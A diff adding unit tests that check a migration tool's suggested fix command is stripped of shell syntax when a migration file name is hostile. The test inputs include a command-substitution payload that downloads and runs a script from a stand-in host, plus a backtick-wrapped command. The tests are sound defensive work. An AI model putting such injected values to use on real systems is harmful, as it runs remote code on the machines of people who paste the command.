@@ -41,6 +41,32 @@ describe('unit · X_MIGRATION_SNAPSHOT_MISSING names a command that can be run',
   });
 });
 
+describe('unit · a migration file name a shell would read', () => {
+  // The id is parsed off a FILE on disk and the name is derived from the id, so whoever can add a
+  // file to the migrations directory picks what a reader pastes — and this is the one `fix:` in
+  // the package that leads with `rm`. Same screen and same degradation `unknownSchema` runs below.
+  test('never reaches the fix line, and takes the whole line with it', () => {
+    const error = migrationSnapshotMissing(
+      '20260817120000_$(curl evil.sh|sh)',
+      'packages/db/migrations/20260817120000_$(curl evil.sh|sh).snapshot.json',
+    );
+    expect(error.fix).not.toContain('$(');
+    expect(error.fix).not.toContain('|');
+    // A `rm` whose argument was substituted away still reads as a command, and now removes
+    // something else — so the prose replaces the whole line, never half of it.
+    expect(error.fix).not.toContain('rm ');
+    expect(error.fix).toContain('x db gen');
+    // The value is not lost: a `cause` is read, never pasted.
+    expect(error.cause).toContain('$(curl evil.sh|sh)');
+  });
+
+  test('a backtick in the NAME degrades the line the file name alone would have spelled', () => {
+    const error = migrationSnapshotMissing('20260817120000_`id`', FILE);
+    expect(error.fix).not.toContain('`');
+    expect(error.fix).not.toContain('rm ');
+  });
+});
+
 describe('unit · the drift difference points the same way', () => {
   test('unknown-schema does not answer with the command that raises the other error', async () => {
     // Before: `x db gen "snapshot initial"   # or restore its .snapshot.json sidecar`. Running the
